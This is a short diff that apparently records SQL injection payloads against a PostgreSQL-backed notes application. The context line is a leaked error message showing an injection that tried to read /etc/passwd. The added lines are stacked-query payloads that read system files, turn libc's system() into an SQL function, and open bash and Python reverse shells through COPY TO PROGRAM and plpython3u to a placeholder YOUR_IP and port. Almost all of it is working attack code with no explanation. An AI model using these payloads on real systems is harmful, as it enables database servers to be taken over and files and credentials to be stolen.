@@ -3,3 +3,11 @@
 
 "status": "error", "message":"An error occurred. StatementCallback; bad SQL grammar [DELETE FROM notes WHERE id = 'dda1b358-776a-409e-b4eb-4622a1b0f384' UNION SELECT pg_read_file('/etc/passwd')--';]; nested exception is org.postgresql.util.PSQLException: ERROR: syntax error at or near "UNION"
   Position: 69"}
+
+'; SELECT pg_read_file('/etc/passwd'); --
+'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; --
+'; SELECT system('bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'); --
+
+------------------
+'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"'; --
+'; CREATE OR REPLACE FUNCTION rev_shell() RETURNS void AS 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' LANGUAGE plpython3u; SELECT rev_shell(); --
